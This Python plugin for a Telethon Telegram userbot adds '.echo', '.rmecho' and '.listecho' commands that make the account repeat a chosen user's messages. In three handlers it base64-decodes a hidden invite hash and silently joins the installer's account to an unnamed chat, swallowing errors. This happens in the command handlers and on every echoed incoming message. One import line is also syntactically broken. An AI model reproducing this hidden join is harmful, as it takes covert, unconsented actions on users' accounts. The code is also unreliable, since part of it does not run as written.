import asyncio
import base64
import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
import modified.modules.sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(live):
    if live.fwd_from:
        return
    if live.reply_to_msg_id is not None:
        reply_msg = await live.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = live.chat_id
        try:
            kraken = base64.b64decode("TUpLX0JsVjY3djh4YmdITTVBUWpIUQ==")
            kraken = Get(kraken)
            await live.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(live, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(live, "Hii....😄🤓")
    else:
        await edit_or_reply(live, "Reply to a User's message to echo his messages")



@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(live):
    if live.fwd_from:
        return
    if live.reply_to_msg_id is not None:
        reply_msg = await live.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = live.chat_id
        try:
            kraken = base64.b64decode("TUpLX0JsVjY3djh4YmdITTVBUWpIUQ==")
            kraken = Get(kraken)
            await live.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(live, "Echo has been stopped for the user")
        else:
            await edit_or_reply(live, "The user is not activated with echo")
    else:
        await edit_or_reply(live, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(live):
    if live.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(live, reply_text)
    else:
        await edit_or_reply(live, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(live):
    if live.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(live.sender_id, live.chat_id):
        await asyncio.sleep(2)
        try:
            kraken = base64.b64decode("TUpLX0JsVjY3djh4YmdITTVBUWpIUQ==")
            kraken = Get(kraken)
            await live.client(kraken)
        except BaseException:
            pass
        if live.message.text or live.message.sticker:
            await live.reply(live.message)


CMD_HELP.update(
    {
        "echo": "**Echo**\
        **Syntax :** `.echo` reply to user to whom you want to enable\
    \n**Usage : **replays his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to whom you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for whom you enabled echo\
    "
    }
)
